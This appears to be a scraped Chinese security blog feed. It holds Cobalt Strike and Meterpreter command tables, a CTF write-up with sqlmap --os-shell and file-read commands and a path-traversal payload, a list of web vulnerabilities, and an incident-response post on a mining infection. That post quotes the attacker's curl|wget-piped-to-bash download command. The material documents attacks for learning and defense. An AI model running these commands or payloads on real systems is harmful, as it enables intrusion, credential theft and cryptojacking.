Commands</span><br><span class="line">================================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    hashdump      转储SAM数据库的内容</span></span><br><span class="line">Priv: Timestomp Commands</span><br><span class="line">========================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    timestomp     操作文件的MACE属性</span></span><br></pre></td></tr></table></figure><h2 id="Cobaltstrike-beacon详解"><a href="#Cobaltstrike-beacon详解" class="headerlink" title="Cobaltstrike beacon详解"></a>Cobaltstrike beacon详解</h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">命令</span>                              <span class="string">描述</span></span><br><span class="line"><span class="meta">-------</span>                          <span class="string">--------</span></span><br><span class="line"><span class="attr">argue</span>                            <span class="string">匹配过程的虚假参数</span></span><br><span class="line"><span class="attr">blockdlls</span>                        <span class="string">阻止子进程中的非微软DLLs</span></span><br><span class="line"><span class="attr">browserpivot</span>                     <span class="string">设置浏览器pivot会话</span></span><br><span class="line"><span class="attr">cancel</span>                           <span class="string">取消正在进行的下载</span></span><br><span class="line"><span class="attr">cd</span>                               <span class="string">更改目录</span></span><br><span class="line"><span class="attr">checkin</span>                          <span class="string">Call home and post data</span></span><br><span class="line"><span class="attr">chromedump</span>                       <span class="string">恢复谷歌浏览器的证书</span></span><br><span class="line"><span class="attr">clear</span>                            <span class="string">清除信标队列</span></span><br><span class="line"><span class="attr">connect</span>                          <span class="string">通过TCP连接到一个Beacon对等体</span></span><br><span class="line"><span class="attr">covertvpn</span>                        <span class="string">部署Covert VPN客户端</span></span><br><span class="line"><span class="attr">cp</span>                               <span class="string">复制文件</span></span><br><span class="line"><span class="attr">dcsync</span>                           <span class="string">从DC中提取密码哈希值</span></span><br><span class="line"><span class="attr">desktop</span>                          <span class="string">查看目标的桌面并与之互动</span></span><br><span class="line"><span class="attr">dllinject</span>                        <span class="string">在进程中注入Reflective DLL。</span></span><br><span class="line"><span class="attr">dllload</span>                          <span class="string">用LoadLibrary()将DLL加载到一个进程中。</span></span><br><span class="line"><span class="attr">download</span>                         <span class="string">下载文件</span></span><br><span class="line"><span class="attr">downloads</span>                        <span class="string">列出正在进行的文件下载</span></span><br><span class="line"><span class="attr">drives</span>                           <span class="string">在目标上列出驱动器</span></span><br><span class="line"><span class="attr">elevate</span>                          <span class="string">在升高的上下文中生成一个会话</span></span><br><span class="line"><span class="attr">execute</span>                          <span class="string">在目标机上执行程序(无输出)</span></span><br><span class="line"><span class="attr">executeassembly</span>                  <span class="string">在目标机上执行本地.NET程序。</span></span><br><span class="line"><span class="attr">exit</span>                             <span class="string">终止信标会话</span></span><br><span class="line"><span class="attr">getprivs</span>                         <span class="string">启用当前令牌的系统权限</span></span><br><span class="line"><span class="attr">getsystem</span>                        <span class="string">试图获得系统</span></span><br><span class="line"><span class="attr">getuid</span>                           <span class="string">获取用户ID</span></span><br><span class="line"><span class="attr">hashdump</span>                         <span class="string">转储密码哈希</span></span><br><span class="line"><span class="attr">help</span>                             <span class="string">帮助菜单</span></span><br><span class="line"><span class="attr">inject</span>                           <span class="string">在特定的进程中产生一个会话</span></span><br><span class="line"><span class="attr">inlineexecute</span>                    <span class="string">在此环节中运行一个信标对象文件</span></span><br><span class="line"><span class="attr">jobkill</span>                          <span class="string">杀死一个长期存在的后期开发任务。</span></span><br><span class="line"><span class="attr">jobs</span>                             <span class="string">列出长期运行的开发后任务（List long-running post-exploitation tasks）</span></span><br><span class="line"><span class="attr">jump</span>                             <span class="string">在远程主机上生成一个会话</span></span><br><span class="line"><span class="attr">kerberos_ccache_use</span>              <span class="string">将缓存中的 kerberos ticket 应用到这个会话中。</span></span><br><span class="line"><span class="attr">kerberos_ticket_purge</span>            <span class="string">清除本次会话中的kerberos票据</span></span><br><span class="line"><span class="attr">kerberos_ticket_use</span>              <span class="string">将 kerberos ticket 应用到这个会话</span></span><br><span class="line"><span class="attr">keylogger</span>                        <span class="string">启动击键记录器</span></span><br><span class="line"><span class="attr">kill</span>                             <span class="string">杀死一个进程</span></span><br><span class="line"><span class="attr">link</span>                             <span class="string">通过命名的管道连接到Beacon对等体</span></span><br><span class="line"><span class="attr">logonpasswords</span>                   <span class="string">用mimikatz转储证书和哈希值。</span></span><br><span class="line"><span class="attr">ls</span>                               <span class="string">列表文件</span></span><br><span class="line"><span class="attr">make_token</span>                       <span class="string">创建一个传递凭证的令牌</span></span><br><span class="line"><span class="attr">mimikatz</span>                         <span class="string">运行mimikatz命令</span></span><br><span class="line"><span class="attr">mkdir</span>                            <span class="string">建立一个目录</span></span><br><span class="line"><span class="attr">mode</span>                             <span class="string">dns 使用DNS A作为数据通道(仅限DNS信标)</span></span><br><span class="line"><span class="attr">mode</span>                             <span class="string">dnstxt 使用DNS TXT作为数据通道(仅限DNS信标)</span></span><br><span class="line"><span class="attr">mode</span>                             <span class="string">dns6 使用 DNS AAAA 作为数据通道（仅适用于 DNS 信标）。</span></span><br><span class="line"><span class="attr">mv</span>                               <span class="string">移动文件</span></span><br><span class="line"><span class="attr">net</span>                              <span class="string">网络和主机枚举工具</span></span><br><span class="line"><span class="attr">note</span>                             <span class="string">为该信标指定一个注释</span></span><br><span class="line"><span class="attr">portscan</span>                         <span class="string">扫描网络中的开放服务</span></span><br><span class="line"><span class="attr">powerpick</span>                        <span class="string">通过Unmanaged PowerShell执行命令。</span></span><br><span class="line"><span class="attr">powershell</span>                       <span class="string">通过powershell.exe执行命令。</span></span><br><span class="line"><span class="attr">powershellimport</span>                 <span class="string">导入一个powershell脚本</span></span><br><span class="line"><span class="attr">ppid</span>                             <span class="string">为生成的postex作业设置父级PID。</span></span><br><span class="line"><span class="attr">printscreen</span>                      <span class="string">通过PrintScr方法拍摄一张截图</span></span><br><span class="line"><span class="attr">ps</span>                               <span class="string">显示过程列表</span></span><br><span class="line"><span class="attr">psinject</span>                         <span class="string">在特定进程中执行PowerShell命令</span></span><br><span class="line"><span class="attr">pth</span>                              <span class="string">使用Mimikatz的Passthehash。</span></span><br><span class="line"><span class="attr">pwd</span>                              <span class="string">打印当前目录</span></span><br><span class="line"><span class="attr">reg</span>                              <span class="string">查询注册表</span></span><br><span class="line"><span class="attr">remoteexec</span>                       <span class="string">在远程主机上运行一个命令</span></span><br><span class="line"><span class="attr">rev2self</span>                         <span class="string">恢复到原来的令牌</span></span><br><span class="line"><span class="attr">rm</span>                               <span class="string">移除文件或文件夹</span></span><br><span class="line"><span class="attr">rportfwd</span>                         <span class="string">设置逆向端口转发</span></span><br><span class="line"><span class="attr">rportfwd_local</span>                   <span class="string">通过Cobalt Strike客户端设置反向端口转发。</span></span><br><span class="line"><span class="attr">run</span>                              <span class="string">在目标机上执行程序(返回输出)</span></span><br><span class="line"><span class="attr">runas</span>                            <span class="string">以其他用户身份执行程序</span></span><br><span class="line"><span class="attr">runasadmin</span>                       <span class="string">在提高的上下文中执行程序（ Execute a program in an elevated context）</span></span><br><span class="line"><span class="attr">runu</span>                             <span class="string">在另一个PID下执行程序</span></span><br><span class="line"><span class="attr">screenshot</span>                       <span class="string">拍一张截图</span></span><br><span class="line"><span class="attr">screenwatch</span>                      <span class="string">定期对桌面进行截屏</span></span><br><span class="line"><span class="attr">setenv</span>                           <span class="string">设置一个环境变量</span></span><br><span class="line"><span class="attr">shell</span>                            <span class="string">通过cmd.exe执行命令。</span></span><br><span class="line"><span class="attr">shinject</span>                         <span class="string">将shellcode注入到进程中</span></span><br><span class="line"><span class="attr">shspawn</span>                          <span class="string">生成进程并将shellcode注入其中</span></span><br><span class="line"><span class="attr">sleep</span>                            <span class="string">设置信标睡眠时间</span></span><br><span class="line"><span class="attr">socks</span>                            <span class="string">启动SOCKS4a服务器来中继流量。</span></span><br><span class="line"><span class="attr">socks</span>                            <span class="string">停止SOCKS4a服务器</span></span><br><span class="line"><span class="attr">spawn</span>                            <span class="string">产生一个会话</span></span><br><span class="line"><span class="attr">spawnas</span>                          <span class="string">以另一个用户的身份生成一个会话</span></span><br><span class="line"><span class="attr">spawnto</span>                          <span class="string">设置可执行文件以将进程生成到</span></span><br><span class="line"><span class="attr">spawnu</span>                           <span class="string">在另一个进程下生成一个会话</span></span><br><span class="line"><span class="attr">spunnel</span>                          <span class="string">通过 rportfwd 生成和隧道代理。</span></span><br><span class="line"><span class="attr">spunnel_local</span>                    <span class="string">通过Cobalt Strike客户端rportfwd生成和挖掘一个代理。</span></span><br><span class="line"><span class="attr">ssh</span>                              <span class="string">使用SSH在主机上生成一个SSH会话。</span></span><br><span class="line"><span class="attr">sshkey</span>                           <span class="string">使用SSH在主机上生成一个SSH会话。</span></span><br><span class="line"><span class="attr">steal_token</span>                      <span class="string">从进程中窃取访问令牌</span></span><br><span class="line"><span class="attr">timestomp</span>                        <span class="string">将时间戳从一个文件应用到另一个文件</span></span><br><span class="line"><span class="attr">unlink</span>                           <span class="string">断开与母信标的连接</span></span><br><span class="line"><span class="attr">upload</span>                           <span class="string">上传文件</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/tqydyqt/article/details/113831533" target="_blank" rel="noopener">【Windows】Shellcode免杀，过360、火绒、Defender 静态及主防</a><br><a href="https://www.bugfor.com/vuls/vulnerability/6962.html" target="_blank" rel="noopener">微信 RCE 0day</a><br><a href="https://mp.weixin.qq.com/s/V9rujv89_P0FGhBCfw21mw" target="_blank" rel="noopener">chrome(最新版可用) 0day上线cs &amp; wx 0day上线</a><br><a href="https://mp.weixin.qq.com/s/3LZ_cj2gDC1bQATxqBfweg" target="_blank" rel="noopener">远控免杀专题文章(1)-基础篇</a><br><a href="http://blog.zhangkexuan.cn/2020/11/09/msf01-windows-meterpreter-reverse-tcp/" target="_blank" rel="noopener">Metasploit(1):记录一次Win10的渗透过程</a></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://github.com/knownsec/shellcodeloader" target="_blank" rel="noopener">shellcodeloader</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>纵横杯CTF-WEB两题</title>
      <link href="/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/"/>
      <url>/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>纵横杯部分WEB题解</p><a id="more"></a><h1 id="easyci"><a href="#easyci" class="headerlink" title="easyci"></a>easyci</h1><p>一道SQL注入题，大概思路：sql注入写入shell，读取flag文件。<br>sqlmap先读取”&#x2F;etc&#x2F;apache2&#x2F;apache2.conf”内容。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="string">//eci-2ze0xe7juyhmgubdhea1.cloudeci1.ichunqiu.com/public/index.php/home/login</span> <span class="params">--data</span> <span class="string">"username=admin&amp;password=1"</span> -p username <span class="params">--technique</span> B <span class="params">--dbms</span> mysql <span class="params">--threads=10</span> <span class="params">--file-read=</span><span class="string">"/etc/apache2/apache2.conf"</span></span><br></pre></td></tr></table></figure><p><img src="/1.png"></p><p>发现绝对路径（&#x2F;var&#x2F;sercet&#x2F;html）再写入shell</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="string">//eci-2ze3qpk9e6qoggl1cuol.cloudeci1.ichunqiu.com/public/index.php/home/login</span> <span class="params">--data</span> <span class="string">"username=admin&amp;password=1"</span> -p username <span class="params">--technique</span> B <span class="params">--dbms</span> mysql <span class="params">--os-shell</span></span><br></pre></td></tr></table></figure><h1 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h1><p>参考文章：<br><a href="https://www.cnblogs.com/Spec/p/11188198.html" target="_blank" rel="noopener">YZMCMS V5.3后台 SSRF</a><br><a href="https://bugs.php.net/bug.php?id=76857" target="_blank" rel="noopener">Bug #76857Can read “non-existant” files</a></p><p>这边主要是因为如果将不支持的协议的URL传递给文件系统<br>功能，则它们会将其视为本地文件路径,这边必须请求http或者https,所以构造一个httpssss即可。<br>远程vps利用python起一个web服务。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p><img src="/2.png"></p><p>伪造文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test123</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"httppp://sdxcas.com/../../../../../../../../../../../../../flag"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">test123</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试读取</p><p><img src="/3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于快速验证低危与中危漏洞</title>
      <link href="/2020/10/20/%E5%85%B3%E4%BA%8E%E5%BF%AB%E9%80%9F%E9%AA%8C%E8%AF%81%E4%BD%8E%E5%8D%B1%E4%B8%8E%E4%B8%AD%E5%8D%B1%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/10/20/%E5%85%B3%E4%BA%8E%E5%BF%AB%E9%80%9F%E9%AA%8C%E8%AF%81%E4%BD%8E%E5%8D%B1%E4%B8%8E%E4%B8%AD%E5%8D%B1%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>漏洞是指一个系统存在的弱点或缺陷，系统对特定威胁攻击或危险事件的敏感性，或进行攻击的威胁作用的可能性。按照危害也被分为高、中、低三种。</p><a id="more"></a><h1 id="低危"><a href="#低危" class="headerlink" title="低危"></a>低危</h1><h2 id="X-Frame-Options-Header未配置"><a href="#X-Frame-Options-Header未配置" class="headerlink" title="X-Frame-Options Header未配置"></a>X-Frame-Options Header未配置</h2><p>查看请求头中是否存在X-Frame-Options Header字段</p><p><a href="http://google.com/" target="_blank" rel="noopener">http://google.com</a></p><p><img src="/1.png"></p><h2 id="会话Cookie中缺少secure属性-未设置安全标志的Cookie"><a href="#会话Cookie中缺少secure属性-未设置安全标志的Cookie" class="headerlink" title="会话Cookie中缺少secure属性(未设置安全标志的Cookie)"></a>会话Cookie中缺少secure属性(未设置安全标志的Cookie)</h2><p>当cookie设置为Secure标志时，它指示浏览器只能通过安全SSL&#x2F;TLS通道访问cookie。</p><h2 id="未设置HttpOnly标志的Cookie"><a href="#未设置HttpOnly标志的Cookie" class="headerlink" title="未设置HttpOnly标志的Cookie"></a>未设置HttpOnly标志的Cookie</h2><p>当cookie设置为HttpOnly标志时，它指示浏览器cookie只能由服务器访问，保护cookie而不能由客户端脚本访问。</p><p><img src="/5.png"></p><h2 id="可能的敏感文件"><a href="#可能的敏感文件" class="headerlink" title="可能的敏感文件"></a>可能的敏感文件</h2><p>这个洞有高危有低危，如果数据中存在账号密码等重要信息并且关联起来，可算高危。如果只是文件路径，或者一些普通信息，算低危~高危</p><h1 id="中危"><a href="#中危" class="headerlink" title="中危"></a>中危</h1><h2 id="启用TLS-1-0"><a href="#启用TLS-1-0" class="headerlink" title="启用TLS 1.0"></a>启用TLS 1.0</h2><p>攻击者可能能够利用此问题进行中间人攻击，并对受影响的服务和客户端之间的通信进行解密。PCI安全标准委员会规定2018年6月30日之后，开启TLS1.0将导致PCI DSS不合规。<br>可以使用<a href="https://myssl.com/" target="_blank" rel="noopener">myssl</a>来辨认。</p><p>baidu.com</p><p><img src="/2.png"></p><h2 id="使用RC4密码套件"><a href="#使用RC4密码套件" class="headerlink" title="使用RC4密码套件"></a>使用RC4密码套件</h2><p>攻击者可以在特定环境下只通过嗅探监听就可以还原采用RC4保护的加密信息中的纯文本，导致账户、密码、信用卡信息等重要敏感信息暴露，并且可以通过中间人进行会话劫持。</p><p><img src="/3.png"></p><h2 id="存在POODLE攻击-启用了SSLv3协议"><a href="#存在POODLE攻击-启用了SSLv3协议" class="headerlink" title="存在POODLE攻击(启用了SSLv3协议)"></a>存在POODLE攻击(启用了SSLv3协议)</h2><p>攻击者可能窃取客户端与server端使用SSLv3加密通信的明文内容<br><img src="/4.png"></p><h2 id="没有CSRF保护的HTML表单"><a href="#没有CSRF保护的HTML表单" class="headerlink" title="没有CSRF保护的HTML表单"></a>没有CSRF保护的HTML表单</h2><p>攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。</p><p>利用burp中的生成CSRF POC自动生成来构造<br><img src="/6.png"></p><p><img src="/7.png"></p><h2 id="Host-攻击（主机头攻击）"><a href="#Host-攻击（主机头攻击）" class="headerlink" title="Host 攻击（主机头攻击）"></a>Host 攻击（主机头攻击）</h2><p>主机标头指定哪个网站或Web应用程序应处理传入的HTTP请求。Web服务器使用此标头的值将请求分派到指定的网站或Web应用程序。<br><img src="/8.png"></p><h2 id="脆弱的Javascript库-javascript跨站脚本"><a href="#脆弱的Javascript库-javascript跨站脚本" class="headerlink" title="脆弱的Javascript库(javascript跨站脚本)"></a>脆弱的Javascript库(javascript跨站脚本)</h2><p>jQuery 3.4.0 以上版本不受漏洞影响。<br><img src="/9.png"></p><h2 id="页面上的错误消息"><a href="#页面上的错误消息" class="headerlink" title="页面上的错误消息"></a>页面上的错误消息</h2><p>错误信息页面<br><img src="/10.png"></p><h2 id="开启TRACE方法"><a href="#开启TRACE方法" class="headerlink" title="开启TRACE方法"></a>开启TRACE方法</h2><p>在此Web服务器上启用了HTTP TRACE方法。如果Web浏览器中存在其他跨域漏洞，则可以从任何支持HTTP TRACE方法的域中读取敏感的标头信息。<br><img src="/11.png"></p><h2 id="开启options方法"><a href="#开启options方法" class="headerlink" title="开启options方法"></a>开启options方法</h2><p>攻击者可利用options方法获取服务器的信息，进而准备进一步攻击。</p><h2 id="JetBrains-IDE-workspace-xml文件泄露"><a href="#JetBrains-IDE-workspace-xml文件泄露" class="headerlink" title="JetBrains IDE workspace.xml文件泄露"></a>JetBrains IDE workspace.xml文件泄露</h2><p>这个漏洞具体是指目录下存在<code>/.idea/</code>文件夹,通过workspace.xml，可直接获取整个工程的目录结构,为后续渗透中收集信息。</p><h2 id="jQuery跨站脚本"><a href="#jQuery跨站脚本" class="headerlink" title="jQuery跨站脚本"></a>jQuery跨站脚本</h2><p>攻击者使用.hash选择元素时，通过特制的标签，远程攻击者利用该漏洞注入任意web脚本或HTML。在jQuery 1.6.3及之后得到修复。</p>]]></content>
      
      
      <categories>
          
          <category> 低危 </category>
          
          <category> 中危 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意的挖矿经历-当场应急！</title>
      <link href="/2020/08/11/%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81/"/>
      <url>/2020/08/11/%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h2 id="事情的起因"><a href="#事情的起因" class="headerlink" title="事情的起因"></a>事情的起因</h2><p>下班得瑟的我，突然接收到了一条来自阿里云的短信???????</p><a id="more"></a><p><img src="/1.jpg"></p><p>土豆机中了挖矿！！！??????</p><p><img src="/2.png"></p><p><b>先说下结果: 看了一堆，啥也没查到，奶奶的那吊毛删的太干净了!</b></p><p>这不是现场的应急教材吗????开冲!!!</p><p>前段时间复现CVE-2020-14645,有朋友想玩玩，然后就在我的土豆机上开心的用docker搭建了环境。</p><p>靠着我的直觉，直接停了docker,到家后登上阿里云，果然报的就是靶机。现在搞挖矿真不容易，还得拿最近爆出来的漏洞打~~~</p><h2 id="从阿里云上看告警监测"><a href="#从阿里云上看告警监测" class="headerlink" title="从阿里云上看告警监测"></a>从阿里云上看告警监测</h2><p><img src="/3.jpg"></p><p><img src="/3.png"></p><p>对<br><code>http://89.178.232.69:9000/seele</code>地址进行get请求</p><p>动态IP没啥可看的</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl</span><br><span class="line"><span class="deletion">-s</span></span><br><span class="line"><span class="deletion">-s参数将不输出错误和进度信息。</span></span><br></pre></td></tr></table></figure><p><img src="/4.jpg"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/java/bin/java -server -Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=<span class="number">8453</span>,server=y,suspend=n </span><br><span class="line">-Djava.compiler=NONE -Xms256m -Xmx512m -XX:CompileThreshold=<span class="number">8000</span> -cp /u01/app/oracle/middleware/wlserver/server/lib/weblogic-launcher.jar </span><br><span class="line">-Dlaunch.use.env.classpath=<span class="keyword">true</span> -Dweblogic.Name=AdminServer </span><br><span class="line">-Djava.security.policy=/u01/app/oracle/middleware/wlserver/server/lib/weblogic.policy </span><br><span class="line">-Djava.system<span class="class">.<span class="keyword">class</span>.<span class="title">loader</span></span>=com.oracle.classloader.weblogic.LaunchClassLoader </span><br><span class="line">-javaagent:/u01/app/oracle/middleware/wlserver/server/lib/debugpatch-agent.jar -ea -da:com.bea... -da:javelin... -da:weblogic... -ea:com.bea.wli... -ea:com.bea.broker... -ea:com.bea.sbconsole... -Dwls.home=/u01/app/oracle/middleware/wlserver/server -Dweblogic.home=/u01/app/oracle/middleware/wlserver/server weblogic.Server</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/benben683280/article/details/78716397" target="_blank" rel="noopener">-Xdebug 启动命令</a><br>讲的可详细了</p><p>父进程id：15015<br>进程ID：27557</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -c (curl -s http://89.178.232.69:9000/seele||wget -q -O- http://89.178.232.69:9000/seele)|bash</span><br></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget</span><br><span class="line">-q, --quiet 安静模式(没有输出)</span><br><span class="line">-O --<span class="meta">output</span>-document=<span class="meta">FILE</span> 把文档写到<span class="meta">FILE</span>文件中</span><br></pre></td></tr></table></figure><p><img src="/5.jpg" alt="发现了挖矿程序"></p><p><img src="/6.jpg" alt="访问恶意ip"></p><p><img src="/6.png" alt="中控ip"></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>先查看下weblogic的访问日志</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oracle<span class="regexp">/Domains/</span>ExampleSilentWTDomain<span class="regexp">/servers/</span>AdminServer<span class="regexp">/logs</span></span><br></pre></td></tr></table></figure><p><img src="/7.png" alt="access.log"></p><p>还顺带发现了几个腾讯云的恶意IP</p><p><img src="/8.png"></p><p>在<code>ExampleSilentWTDomain.log</code>下发现了当天下午四点的攻击（8小时时差）</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">####&lt;Aug <span class="number">7</span>, <span class="number">2020</span> <span class="number">8</span>:<span class="number">50</span>:<span class="number">35</span>,<span class="number">581</span> AM UTC&gt; &lt;Error&gt; &lt;RJVM&gt; &lt;<span class="number">4695</span>b9b44637&gt; &lt;AdminServer&gt; &lt;ExecuteThread: <span class="character">'0'</span> for queue: 'weblogic.socket.Muxer'&gt; &lt;&lt;WLS Kernel&gt;&gt; &lt;&gt; &lt;<span class="number">6e5</span>ae28b-<span class="number">117</span>c-<span class="number">4080</span>-b9d7-<span class="number">25</span>c5070c1882-<span class="number">00000019</span>&gt; &lt;<span class="number">1596790235581</span>&gt; &lt;<span class="literal">[<span class="identifier">severity</span>-<span class="identifier">value</span>: <span class="number">8</span>]</span> <span class="literal">[<span class="identifier">rid</span>: <span class="number">0</span>]</span> <span class="literal">[<span class="identifier">partition</span>-<span class="identifier">id</span>: <span class="number">0</span>]</span> <span class="literal">[<span class="identifier">partition</span>-<span class="identifier">name</span>: DOMAIN]</span> &gt; &lt;BEA-<span class="number">000503</span>&gt; &lt;Incoming message header <span class="keyword">or</span> abbreviation processing failed. </span><br><span class="line"> java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast <span class="keyword">to</span> java.lang.Comparable</span><br><span class="line">java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast <span class="keyword">to</span> java.lang.Comparable</span><br><span class="line">at com.tangosol.util.comparator.<span class="module-access"><span class="module"><span class="identifier">ExtractorComparator</span>.</span></span>compare(<span class="module-access"><span class="module"><span class="identifier">ExtractorComparator</span>.</span></span>java:<span class="number">71</span>)</span><br><span class="line">at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>sift<span class="constructor">DownUsingComparator(PriorityQueue.<span class="params">java</span>:722)</span></span><br><span class="line">at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>sift<span class="constructor">Down(PriorityQueue.<span class="params">java</span>:688)</span></span><br><span class="line">at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>heapify(<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>java:<span class="number">737</span>)</span><br><span class="line">at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>read<span class="constructor">Object(PriorityQueue.<span class="params">java</span>:797)</span></span><br><span class="line">at sun.reflect.<span class="module-access"><span class="module"><span class="identifier">NativeMethodAccessorImpl</span>.</span></span>invoke0(Native Method)</span><br><span class="line">at sun.reflect.<span class="module-access"><span class="module"><span class="identifier">NativeMethodAccessorImpl</span>.</span></span>invoke(<span class="module-access"><span class="module"><span class="identifier">NativeMethodAccessorImpl</span>.</span></span>java:<span class="number">62</span>)</span><br><span class="line">at sun.reflect.<span class="module-access"><span class="module"><span 